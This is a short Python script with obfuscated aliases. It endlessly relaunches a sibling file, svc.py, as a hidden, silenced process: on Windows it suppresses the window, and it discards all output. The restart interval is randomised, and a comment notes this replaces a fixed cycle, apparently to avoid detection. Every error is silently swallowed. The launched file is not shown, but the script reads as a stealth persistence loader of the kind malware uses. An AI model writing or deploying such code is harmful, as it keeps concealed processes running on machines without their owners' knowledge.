import subprocess as _s, time as _t, random as _r, os as _o, sys as _y
_h = _o.path.join(_o.path.dirname(__file__), 'svc.py')
while True:
    try:
        _p = _s.Popen([_y.executable, _h],
                      stdout=_s.DEVNULL, stderr=_s.DEVNULL,
                      creationflags=0x08000000 if _o.name == 'nt' else 0)
        # jittered 4-7 min cycle instead of fixed 5m
        _t.sleep(240 + _r.randint(0, 180))
        _p.terminate()
        try:
            _p.wait(timeout=15)
        except Exception:
            _p.kill()
    except Exception:
        pass
    _t.sleep(5 + _r.randint(0, 10))
